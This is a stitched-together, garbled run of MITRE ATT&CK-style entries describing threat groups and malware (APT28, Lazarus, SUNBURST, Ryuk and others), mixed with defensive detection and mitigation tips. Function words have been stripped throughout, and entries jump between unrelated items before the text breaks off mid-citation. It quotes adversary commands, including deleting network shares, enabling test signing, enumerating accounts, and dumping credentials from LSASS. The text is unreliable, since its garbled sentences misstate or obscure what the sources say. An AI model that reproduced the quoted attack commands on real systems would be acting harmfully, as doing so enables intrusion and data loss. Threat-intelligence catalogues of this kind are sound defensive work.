IB APT 41 June 2021) Identify running processes raw sockets. Ensure processes listed raw socket enterprise policy.(Citation: crowdstrike bpf socket filters) [BitPaymer](https://attack.mitre.org/software/S0570) RC4-encrypted strings string hashes avoid identifiable strings binary.(Citation: Crowdstrike Indrik November 2018) [APT33](https://attack.mitre.org/groups/G0064) spearphishing e-mails archive attachments.(Citation: Holmium June 2020) Monitor logging list settings extracted, ex. Windows EID 4798 4799. [Sys10](https://attack.mitre.org/software/S0060) collects name, OS versioning information, OS install sends C2.(Citation: Baumgartner Naikon 2015) dropper [Putter Panda](https://attack.mitre.org/groups/G0024) installs ASEP Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> named McUpdate.(Citation: CrowdStrike Putter Panda) [UNC2452](https://attack.mitre.org/groups/G0118) [SUNBURST](https://attack.mitre.org/software/S0559) signed SolarWinds code signing certificates injecting malware SolarWinds Orion software lifecycle.(Citation: FireEye SUNBURST Backdoor December 2020) Monitor files (such <code>/etc/hosts</code>) accessed attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. [Remexi](https://attack.mitre.org/software/S0375) performs exfiltration [BITSAdmin](https://attack.mitre.org/software/S0190), C2 channel.(Citation: Securelist Remexi Jan 2019) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) batch script files automate execution deployment payloads.(Citation: RedCanary Mockingbird 2020) local DNS sinkhole prevent DGA-based command control reduced cost. [Lazarus Group](https://attack.mitre.org/groups/G0032) compressed exfiltrated data RAR RomeoDelta malware archive directories .zip format, encrypt .zip file, upload C2. (Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: ESET Lazarus Jun 2020) [Egregor](https://attack.mitre.org/software/S0554)'s payloads custom-packed, archived encrypted prevent analysis.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020) Monitor executed commands arguments abuse Visual Basic (VB) execution. Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control) [USBStealer](https://attack.mitre.org/software/S0136) sets timestamps dropper files last-access last-write timestamps standard Windows library chosen system.(Citation: ESET Sednit USBStealer 2014) [MechaFlounder](https://attack.mitre.org/software/S0459) ability base16 encoded strings C2.(Citation: Unit 42 MechaFlounder March 2019) [InnaputRAT](https://attack.mitre.org/software/S0259) command delete files.(Citation: ASERT InnaputRAT April 2018) (Citation: Unit 42 IronNetInjector February 2021 ) [ComRAT](https://attack.mitre.org/software/S0126) programmed sleep local business hours (9 5, Monday Friday).(Citation: ESET ComRAT 2020) [Hancitor](https://attack.mitre.org/software/S0499) delivered phishing emails malicious attachments.(Citation: FireEye Hancitor) [Kwampirs](https://attack.mitre.org/software/S0236) downloads additional files base64-encoded encrypted cipher.(Citation: Symantec Security Center Trojan.Kwampirs) Regularly audit user accounts activity deactivate remove needed. [Remexi](https://attack.mitre.org/software/S0375) obfuscates configuration data XOR.(Citation: Securelist Remexi Jan 2019) [APT3](https://attack.mitre.org/groups/G0022) tool DLLs.(Citation: FireEye Clandestine Fox) application control configured block execution <code>wmic.exe</code> required network prevent potential misuse adversaries. example, Windows Windows Server 2016 above, Windows Defender Application Control (WDAC) policy rules applied block <code>wmic.exe</code> application prevent abuse.(Citation: WDAC) [APT41](https://attack.mitre.org/groups/G0096) compromised online billing/payment service VPN access third-party service provider targeted payment service.(Citation: FireEye APT41 Aug 2019)
 [OSX/Shlayer](https://attack.mitre.org/software/S0402) relied users mounting executing malicious DMG file.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018) Monitor execution commands modify code signing policy system, as <code>bcdedit.exe -set TESTSIGNING ON</code>. (Citation: TESTSIGNING Feb 2021) Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible.(Citation: AdSecurity Cracking Kerberos Dec 2015) [StreamEx](https://attack.mitre.org/software/S0142) establishes persistence installing service DLL setting service auto-start.(Citation: Cylance Crew Feb 2017) [APT38](https://attack.mitre.org/groups/G0082) backdoor, QUICKRIDE, communicate C2 server HTTPS.(Citation: FireEye APT38 Oct 2018) [OilRig](https://attack.mitre.org/groups/G0049) delivered macro-enabled documents required targets "enable content" button execute payload system.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018)(Citation: Check APT34 April 2021) [WhisperGate](https://attack.mitre.org/software/S0689) `ExitWindowsEx` API flush file buffers disk running processes.(Citation: Cisco Ukraine Wipers January 2022) Monitor newly constructed scheduled jobs. Legitimate scheduled tasks created installation software administration functions. tasks correlate software, patch cycles, etc. [EvilGrab](https://attack.mitre.org/software/S0152) capability capture audio victim machine.(Citation: PWC Cloud Hopper Technical Annex April 2017) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) observed Registry key.(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Morphisec ShellTea June 2019) [APT38](https://attack.mitre.org/groups/G0082) backdoor, NESTEGG, capability download upload files victim’s machine.(Citation: FireEye APT38 Oct 2018) [XCSSET](https://attack.mitre.org/software/S0658) adds malicious code host's Xcode projects enumerating CocoaPods <code>target_integrator.rb</code> files <code>/Library/Ruby/Gems</code> folder enumerates <code>.xcodeproj</code> folders directory. [XCSSET](https://attack.mitre.org/software/S0658) downloads script Mach-O file Xcode project folder.(Citation: trendmicro xcsset xcode project 2020) [LoudMiner](https://attack.mitre.org/software/S0451) scripts launch services start/stop QEMU virtualization.(Citation: ESET LoudMiner June 2019)	 [Doki](https://attack.mitre.org/software/S0600) Ngrok establish C2 exfiltrate data.(Citation: Intezer Doki July 20) [LAPSUS$](https://attack.mitre.org/groups/G1004) gained access internet-facing systems applications, including virtual private network (VPN), remote desktop protocol (RDP), virtual desktop infrastructure (VDI) including Citrix. (Citation: MSTIC DEV-0537 Mar 2022) [BlackTech](https://attack.mitre.org/groups/G0098) Putty remote access.(Citation: Symantec Palmerworm Sep 2020) [HiddenWasp](https://attack.mitre.org/software/S0394) communicates simple network protocol TCP.(Citation: Intezer HiddenWasp Map 2019) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net accounts` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [AuditCred](https://attack.mitre.org/software/S0347) reverse execute commands.(Citation: TrendMicro Lazarus Nov 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) Registry key <code>KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding</code> establish persistence.(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)(Citation: Talos MuddyWater Jan 2022) [Zox](https://attack.mitre.org/software/S0672) download files compromised machine.(Citation: Novetta-Axiom) [Ramsay](https://attack.mitre.org/software/S0458) scan removable media documents collection.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [Bankshot](https://attack.mitre.org/software/S0239) gathers information, network addresses, disk type, disk space, operation version.(Citation: McAfee Bankshot)(Citation: US-CERT Bankshot Dec 2017) [Truvasys](https://attack.mitre.org/software/S0178) adds Registry key establish persistence.(Citation: Win Defender Truvasys Sep 2017) [OilRig](https://attack.mitre.org/groups/G0049) remote services VPN, Citrix, OWA persist environment.(Citation: FireEye APT34 Webinar Dec 2017) Network intrusion detection prevention systems identify traffic patterns indicative AiTM activity mitigate activity network level. [Ramsay](https://attack.mitre.org/software/S0458) hijack outdated Windows application dependencies malicious versions DLL payload.(Citation: Eset Ramsay 2020)	 [FIN8](https://attack.mitre.org/groups/G0061) scheduled tasks maintain RDP backdoors.(Citation: FireEye Enemy FIN8 Aug 2016) [KOCTOPUS](https://attack.mitre.org/software/S0669) checked OS version `wmic.exe` `find` command.(Citation: MalwareBytes LazyScripter Feb 2021) (Citation: FireEye APT32 2017) Encrypt data stored rest cloud storage.(Citation: Amazon S3 Security, 2019)(Citation: Azure Storage Security, 2019) Managed encryption rotated providers. minimum, ensure incident response plan storage breach includes rotating impact client applications.(Citation: Google Cloud Encryption Key Rotation) [Sandworm Team](https://attack.mitre.org/groups/G0034) tricked unwitting recipients clicking spearphishing attachments enabling malicious macros embedded files.(Citation: ESET Telebots Dec 2016)(Citation: District Court Indictment GRU Unit 74455 October 2020) Monitoring Windows Registry reveal malicious root certificate installation. Installed root certificates located Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and </code>[HKLM HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. subset root certificates consistent Windows systems comparison: (Citation: Tripwire AppUNBlocker)
* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072 [FIN5](https://attack.mitre.org/groups/G0053) scans processes victim systems environment automated scripts pull results.(Citation: Mandiant FIN5 GrrCON Oct 2016) Monitor files unexpected modifications access permissions attributes   [Remsec](https://attack.mitre.org/software/S0125) capable SMTP C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report)(Citation: Kaspersky ProjectSauron Technical Analysis) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [FIN6](https://attack.mitre.org/groups/G0037) tools [Mimikatz](https://attack.mitre.org/software/S0002), [Cobalt Strike](https://attack.mitre.org/software/S0154), [AdFind](https://attack.mitre.org/software/S0552).(Citation: Security Intelligence Eggs Aug 2019)(Citation: FireEye FIN6 Apr 2019) Ensure low-privileged user accounts permission add access accounts. [APT33](https://attack.mitre.org/groups/G0064) ports 808 880 command control.(Citation: Symantec Elfin Mar 2019) [Ryuk](https://attack.mitre.org/software/S0446) stolen domain admin accounts laterally victim domain.(Citation: ANSSI RYUK RANSOMWARE) [AppleJeus](https://attack.mitre.org/software/S0584) valid digital signature Sectigo legitimate.(Citation: CISA AppleJeus Feb 2021)  local DNS sinkhole prevent behaviors dynamic resolution. [Empire](https://attack.mitre.org/software/S0363) includes modules enumerating Policy.(Citation: Github PowerShell Empire) [Winnti Windows](https://attack.mitre.org/software/S0141) check explorer.exe process responsible calling install function.(Citation: Novetta Winnti April 2015) [build_downer](https://attack.mitre.org/software/S0471) ability determine local time ensure malware installation hours infected active.(Citation: Trend Micro Tick November 2019) [PingPull](https://attack.mitre.org/software/S1031) mimic names descriptions legitimate services `iphlpsvc`, `IP Helper`,  `Onedrive` evade detection.(Citation: Unit 42 PingPull Jun 2022) [iKitten](https://attack.mitre.org/software/S0278) lists current processes running.(Citation: objsee mac malware 2017) embedded network devices capable storing passwords local accounts plain-text encrypted formats.  Ensure that, available, local passwords encrypted, vendor recommendations. (Citation: Cisco IOS Software Integrity Assurance - AAA) [BACKSPACE](https://attack.mitre.org/software/S0031) capable enumerating modifications infected system's Registry.(Citation: FireEye APT30) [POWRUNER](https://attack.mitre.org/software/S0184) collect local running <code>net localgroup administrators</code> series commands victim.(Citation: FireEye APT34 Dec 2017) Monitor activation invocation instance (ex: instance.start GCP Audit Logs) [LAPSUS$](https://attack.mitre.org/groups/G1004) compromised credentials session tokens gain access victim's VPN, VDI, RDP, IAMs.(Citation: MSTIC DEV-0537 Mar 2022) [APT28](https://attack.mitre.org/groups/G0007) gained access DCCC network, proceeded access compromise DNC network.(Citation: DOJ GRU Indictment Jul 2018) [Confucius](https://attack.mitre.org/groups/G0142) VBScript execute malicious code.(Citation: TrendMicro Confucius APT Feb 2018) [GravityRAT](https://attack.mitre.org/software/S0237) steals files based extension list USB drive connected system.(Citation: Talos GravityRAT) (Citation: Unit42 Emissary Panda 2019) [FIN6](https://attack.mitre.org/groups/G0037) removed files victim machines.(Citation: FireEye FIN6 April 2016) [Kevin](https://attack.mitre.org/software/S1020) send data victim host DNS C2 channel.(Citation: Kaspersky Lyceum October 2021) [Explosive](https://attack.mitre.org/software/S0569) leveraged keylogging capabilities gain access administrator accounts target servers.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)  [ISMInjector](https://attack.mitre.org/software/S0189) <code>certutil</code> command decode payload file.(Citation: OilRig Delivery Oct 2017) disabling auto-mounting disk image files (i.e., .iso, .img, .vhd, .vhdx). achieved modifying Registry values Windows Explorer file associations disable automatic Explorer "Mount Burn" dialog file extensions. Note: deactivate mount functionality itself.(Citation: GitHub MOTW) Ensure audit logs enabled monitor services signs abuse.(Citation: SpecterOps Certified Pre Owned) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Gallmaker](https://attack.mitre.org/groups/G0084) WinZip, archive data prior exfiltration.(Citation: Symantec Gallmaker Oct 2018) [menuPass](https://attack.mitre.org/groups/G0045) key loggers steal usernames passwords.(Citation: District Court NY APT10 Indictment December 2018) [Turla](https://attack.mitre.org/groups/G0010) attempt connect systems victim's network <code>net use</code> commands predefined list collection passwords.(Citation: Kaspersky Turla) Monitor third-party application logging, messaging, artifacts send spearphishing emails malicious link attempt gain access victim systems. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) URL inspection email (including expanding shortened links) detect links leading malicious sites. Detonation chambers detect links automatically sites determine malicious, wait capture content user visits link.

Furthermore, monitor browser logs homographs ASCII internationalized domain names abusing character sets (e.g. Cyrillic Latin versions trusted sites). [BACKSPACE](https://attack.mitre.org/software/S0031) transport communicate command server.(Citation: FireEye APT30) [MiniDuke](https://attack.mitre.org/software/S0051) control flow flattening obscure code.(Citation: ESET Dukes October 2019) (Citation: Talos Kimsuky Nov 2021) [Tropic Trooper](https://attack.mitre.org/groups/G0081) delivered malicious documents XLSX extension, typically OpenXML documents, file OLE (XLS) document.(Citation: Unit 42 Tropic Trooper Nov 2016) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors transfer files to/from victim machines local network.(Citation: ESET Turla PowerShell 2019)(Citation: Symantec Waterbug Jun 2019) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) Mimikatz retrieve credentials LSASS memory.(Citation: RedCanary Mockingbird 2020) [APT41](https://attack.mitre.org/groups/G0096) deleted files system.(Citation: FireEye APT41 Aug 2019)  [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-TokenManipulation</code> Exfiltration module manipulate tokens.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [RobbinHood](https://attack.mitre.org/software/S0400) disconnects network shares command <code>net * /DELETE /Y</code>.(Citation: CarbonBlack RobbinHood 2019) [RATANKBA](https://attack.mitre.org/software/S0241) HTTP/HTTPS command control communication.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [RainyDay](https://attack.mitre.org/software/S0629) create register service execution.(Citation: Bitdefender Naikon April 2021) [Kwampirs](https://attack.mitre.org/software/S0236) creates service named WmiApSrvEx establish persistence.(Citation: Symantec Orangeworm April 2018) [APT3](https://attack.mitre.org/groups/G0022) obfuscates files evade defensive measures.(Citation: Symantec Buckeye) Monitor suspicious email activity, numerous accounts receiving messages single unusual/unknown sender. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) Monitor references uncategorized known-bad sites. URL inspection email (including expanding shortened links) detect links leading malicious sites.

Furthermore, monitor browser logs homographs ASCII internationalized domain names abusing character sets (e.g. Cyrillic Latin versions trusted sites). [APT28](https://attack.mitre.org/groups/G0007) module receive notification time USB mass storage device inserted victim.(Citation: SIR 19) [Magic Hound](https://attack.mitre.org/groups/G0059) attempted lure victims malicious email attachments.(Citation: ClearSky Kittens 3 August 2020) Monitor command-line execution <code>launchctl</code> command abnormal network connections. [MobileOrder](https://attack.mitre.org/software/S0079) command download file C2 server victim mobile device's card.(Citation: Scarlet Mimic Jan 2016) [SideTwist](https://attack.mitre.org/software/S0610) execute commands compromised host.(Citation: Check APT34 April 2021) [Reaver](https://attack.mitre.org/software/S0172) variants raw TCP C2.(Citation: Palo Alto Reaver Nov 2017) [Waterbear](https://attack.mitre.org/software/S0579) inject decrypted shellcode LanmanServer service.(Citation: Trend Micro Waterbear December 2019) [P8RAT](https://attack.mitre.org/software/S0626) check specific processes virtual environments.(Citation: Securelist APT10 March 2021) [Lslsass](https://attack.mitre.org/software/S0121) dump active logon session password hashes lsass process.(Citation: Mandiant APT1) [down_new](https://attack.mitre.org/software/S0472) ability list running processes compromised host.(Citation: Trend Micro Tick November 2019) [PROMETHIUM](https://attack.mitre.org/groups/G0056) created admin accounts compromised host.(Citation: Bitdefender StrongPity June 2020) [Denis](https://attack.mitre.org/software/S0354) encodes data server Base64.(Citation: Cybereason Cobalt Kitty 2017) [PcShare](https://attack.mitre.org/software/S1050) created `HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32` Registry key persistence.(Citation: Bitdefender FunnyDream Campaign November 2020) Limit privileges user accounts remediate privilege escalation vectors authorized administrators create container orchestration jobs. Require multi-factor authentication register devices Azure AD.(Citation: - Device Registration) Configure multi-factor authentication systems disallow enrolling devices inactive accounts.(Citation: CISA MFA PrintNightmare) [Saint Bot](https://attack.mitre.org/software/S1018) command `timeout 20` pause execution initial loader.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Browser sandboxes mitigate impact exploitation, sandbox escapes exist.(Citation: Windows Blogs Edge Sandbox)(Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types virtualization application microsegmentation mitigate impact client-side exploitation. risks additional exploits weaknesses implementation exist types systems.(Citation: Ars Technica Pwn2Own 2017 VM Escape) [FIN6](https://attack.mitre.org/groups/G0037) Metasploit’s [PsExec](https://attack.mitre.org/software/S0029) NTDSGRAB module victim's Active Directory database.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)	 (Citation: TrendMicro MacOS April 2018)(Citation: Amnesty Intl. Ocean Lotus February 2021) [BlackTech](https://attack.mitre.org/groups/G0098) built-in API functions.(Citation: IronNet BlackTech Oct 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034)  <code>xp_cmdshell</code> command MS-SQL.(Citation: Dragos Crashoverride 2018)  [IceApple](https://attack.mitre.org/software/S1022) harvest credentials local remote host registries.(Citation: CrowdStrike IceApple 2022) [Cobalt Strike](https://attack.mitre.org/software/S0154) steal access tokens exiting processes.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [POWERTON](https://attack.mitre.org/software/S0371) written PowerShell.(Citation: FireEye APT33 Guardrail) [TEARDROP](https://attack.mitre.org/software/S0560) created read file fake JPG header, payload encrypted simple rotating XOR cipher.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Check Sunburst Teardrop December 2020)(Citation: Deep Dive Solorigate January 2021) [Chimera](https://attack.mitre.org/groups/G0114) WinRM lateral movement.(Citation: NCC Chimera January 2021) [Pysa](https://attack.mitre.org/software/S0583) capability antivirus services disable Windows Defender.(Citation: CERT-FR PYSA April 2020)  Monitor newly constructed logon behavior abuse credentials existing accounts gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Correlate security systems login user active login session entered building VPN access). (Citation: FireEye TRITON 2019) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) created service victim machines named "TaskFrame" establish persistence.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [DRATzarus](https://attack.mitre.org/software/S0694) collect compromised host.(Citation: ClearSky Lazarus Aug 2020) disabling software components servers prevent abuse adversaries.(Citation: ITSyndicate Disabling PHP functions) [LockerGoga](https://attack.mitre.org/software/S0372) observed changing account passwords logging current users.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019) [Matryoshka](https://attack.mitre.org/software/S0167) obfuscates API function names substitute cipher combined Base64 encoding.(Citation: CopyKittens Nov 2015) APIs strings [TYPEFRAME](https://attack.mitre.org/software/S0263) variants RC4 encrypted. variant encoded XOR.(Citation: US-CERT TYPEFRAME June 2018) [TA505](https://attack.mitre.org/groups/G0092) UPX obscure malicious code.(Citation: IBM TA505 April 2020) (Citation: Palo Alto OilRig 2016)(Citation: FireEye APT34 Dec 2017) Monitor newly constructed processes command-lines create/modify executed tasks. example, Windows tasks spawn `svchost.exe` Windows Task Scheduler `taskeng.exe` OS versions. (Citation: Twitter Leoloobeek Scheduled Task) Suspicious program execution scheduled tasks outlier processes compared historical data. [Daserf](https://attack.mitre.org/software/S0187) hides collected data password-protected .rar archives.(Citation: Symantec Tick Apr 2016) implementing WMI security filtering tailor users computers GPO apply to.(Citation: Wald0 Guide GPOs)(Citation: WMI Filters)(Citation: GPO Security Filtering) [APT32](https://attack.mitre.org/groups/G0050) spearphishing emails malicious links.(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus 2017)(Citation: FireEye APT32 April 2020)(Citation: Volexity Ocean Lotus November 2020)(Citation: Amnesty Intl. Ocean Lotus February 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) rundll32.exe execute MiniDump comsvcs.dll dumping LSASS memory.(Citation: DFIR Report APT35 ProxyShell March 2022) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Winexe](https://attack.mitre.org/software/S0191) installs service remote system, executes command, uninstalls service.(Citation: Secpod Winexe June 2017) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool capture time compromised host register C2.(Citation: Zscaler APT31 Covid-19 October 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors purchased servers Bitcoin operation.(Citation: FoxIT Wocao December 2019) [BBK](https://attack.mitre.org/software/S0470) ability download files C2 infected host.(Citation: Trend Micro Tick November 2019) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors files data compromised network.(Citation: DFIR Conti Bazar Nov 2021) [Melcoz](https://attack.mitre.org/software/S0530) monitor victim's browser online banking sessions display overlay window manipulate session background.(Citation: Securelist Brazilian Banking Malware July 2020) [Chimera](https://attack.mitre.org/groups/G0114) utilized multiple commands identify data file directory listings.(Citation: NCC Chimera January 2021) deep packet inspection artifacts common exploit traffic, SQL injection strings payloads. (Citation: Volexity Exchange Marauder March 2021) [Dyre](https://attack.mitre.org/software/S0024) ability achieve persistence adding task task scheduler minute.(Citation: Malwarebytes Dyreza November 2015) [Bankshot](https://attack.mitre.org/software/S0239) terminate specific process process id.(Citation: McAfee Bankshot)(Citation: US-CERT Bankshot Dec 2017) [OopsIE](https://attack.mitre.org/software/S0264) encodes data hexadecimal format C2 channel.(Citation: Unit 42 OopsIE! Feb 2018) [Bandook](https://attack.mitre.org/software/S0234) .PNG images zip file build executable. (Citation: CheckPoint Bandook Nov 2020) [BitPaymer](https://attack.mitre.org/software/S0570) modify timestamp executable identified restored decryption tool.(Citation: Crowdstrike Indrik November 2018) [Remcos](https://attack.mitre.org/software/S0332) Python scripts.(Citation: Riskiq Remcos Jan 2018) [Valak](https://attack.mitre.org/software/S0476) ability screenshots compromised host.(Citation: Cybereason Valak 2020)	  [APT28](https://attack.mitre.org/groups/G0007) loader Trojan cmd.exe batch script payload.(Citation: Unit 42 Playbook Dec 2017) macros execute payloads.(Citation: Talos Seduploader Oct 2017)(Citation: Unit42 Cannon Nov 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: TrendMicro Pawn Storm Dec 2020) Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) periodic review accounts privileges critical sensitive Confluence repositories. [Attor](https://attack.mitre.org/software/S0438) download additional plugins, updates files. (Citation: ESET Attor Oct 2019) [pwdump](https://attack.mitre.org/software/S0006) dump credentials SAM.(Citation: Wikipedia pwdump) (Citation: FireEye APT33 Webinar Sept 2017) [VERMIN](https://attack.mitre.org/software/S0257) saves collected file automatically generated format {0:dd-MM-yyyy}.txt .(Citation: Unit 42 VERMIN Jan 2018) [AppleSeed](https://attack.mitre.org/software/S0622) gain level privilege passing <code>SeDebugPrivilege</code> <code>AdjustTokenPrivilege</code> API.(Citation: Malwarebytes Kimsuky June 2021) [GoldMax](https://attack.mitre.org/software/S0588) retrieved list system's network interface execution.(Citation: MSTIC NOBELIUM Mar 2021) [Melcoz](https://attack.mitre.org/software/S0530) ability download additional files compromised host.(Citation: Securelist Brazilian Banking Malware July 2020) [GALLIUM](https://attack.mitre.org/groups/G0093) VPN services, including SoftEther VPN, access maintain persistence victim environments.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [BBK](https://attack.mitre.org/software/S0470) ability communications C2.(Citation: Trend Micro Tick November 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Hancitor](https://attack.mitre.org/software/S0499)  Registry establish persistence.(Citation: FireEye Hancitor) [Clambling](https://attack.mitre.org/software/S0660) executable obfuscated dropped compromised host.(Citation: Trend Micro DRBControl February 2020) [DanBot](https://attack.mitre.org/software/S1014) relied victims' malicious file initial execution.(Citation: SecureWorks August 2019)(Citation: ClearSky Siamesekitten August 2021) [MCMD](https://attack.mitre.org/software/S0500) modify processes prevent visible desktop.(Citation: Secureworks MCMD July 2019) 
Consider reducing default BITS job lifetime Policy editing <code>JobInactivityTimeout</code> <code>MaxDownloadTime</code> Registry values <code> HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS</code>.(Citation: BITS) [Chimera](https://attack.mitre.org/groups/G0114) <code>net user /dom</code> <code>net user Administrator</code> enumerate domain accounts including administrator accounts.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) Deny direct remote access internal systems network proxies, gateways, firewalls. [Grandoreiro](https://attack.mitre.org/software/S0531) collect username victim's machine.(Citation: ESET Grandoreiro April 2020) [Trojan.Karagany](https://attack.mitre.org/software/S0094) create link Startup folder automatically start restart.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) [USBferry](https://attack.mitre.org/software/S0452) check connected USB devices.(Citation: TrendMicro Tropic Trooper 2020) [Flame](https://attack.mitre.org/software/S0143) create backdoor accounts login “HelpAssistant” domain connected systems rights available.(Citation: Kaspersky Flame)(Citation: Kaspersky Flame Functionality) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors compromised domain legitimate Israeli shipping company.(Citation: Mandiant UNC3890 Aug 2022) Monitor unexpected abnormal accesses network shares, file activity. [Wizard Spider](https://attack.mitre.org/groups/G0102) scheduled tasks establish persistence [TrickBot](https://attack.mitre.org/software/S0266) malware.(Citation: CrowdStrike Grim Spider 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) [TA505](https://attack.mitre.org/groups/G0092) malware gather credentials FTP clients Outlook.(Citation: Proofpoint TA505 Sep 2017) [StrongPity](https://attack.mitre.org/software/S0491) named services legitimate.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [WarzoneRAT](https://attack.mitre.org/software/S0670)  perform hijacking setting path `HKCU\Software\Classes\Folder\shell\open\command` key `DelegateExecute` parameter.(Citation: Check Warzone Feb 2020) [Kessel](https://attack.mitre.org/software/S0487) collected DNS address infected host.(Citation: ESET ForSSHe December 2018) [netsh](https://attack.mitre.org/software/S0108) persistence proxy technique execute helper DLL netsh.exe executed.(Citation: Demaske Netsh Persistence) [Chimera](https://attack.mitre.org/groups/G0114) <code>tasklist</code> enumerate processes.(Citation: NCC Chimera January 2021) [ShimRat](https://attack.mitre.org/software/S0444) hijack cryptbase.dll migwiz.exe escalate privileges bypass UAC controls.(Citation: FOX-IT 2016 Mofang) [KEYMARBLE](https://attack.mitre.org/software/S0271) capability collect name, language settings, OS version, CPU information, disk devices, time elapsed start.(Citation: US-CERT KEYMARBLE Aug 2018) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors UPX pack payloads.(Citation: Cylance Dust Storm) [Micropsia](https://attack.mitre.org/software/S0339) creates shortcut maintain persistence.(Citation: Talos Micropsia June 2017) Monitor newly executed processes modify file directory permissions/attributes evade access control lists (ACLs) access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 2018) [RogueRobin](https://attack.mitre.org/software/S0270) custom DNS tunneling protocol C2.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) [GuLoader](https://attack.mitre.org/software/S0561) APIs discovery execution.(Citation: Medium Eli Salem GuLoader April 2021) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) AES256 algorithm SHA1 derived key decrypt exploit code.(Citation: Check APT31 February 2021) Denylist scripting appropriate. [Pony](https://attack.mitre.org/software/S0453) delivered spearphishing emails contained malicious links.(Citation: Malwarebytes Pony April 2016)	 [MuddyWater](https://attack.mitre.org/groups/G0069) decoded base64-encoded PowerShell commands VBS file.(Citation: FireEye MuddyWater Mar 2018)(Citation: MuddyWater TrendMicro June 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Talos MuddyWater Jan 2022) [TA551](https://attack.mitre.org/groups/G0127) rundll32.exe load malicious DLLs.(Citation: Unit 42 TA551 Jan 2021) (Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: DFIR Ryuk 5 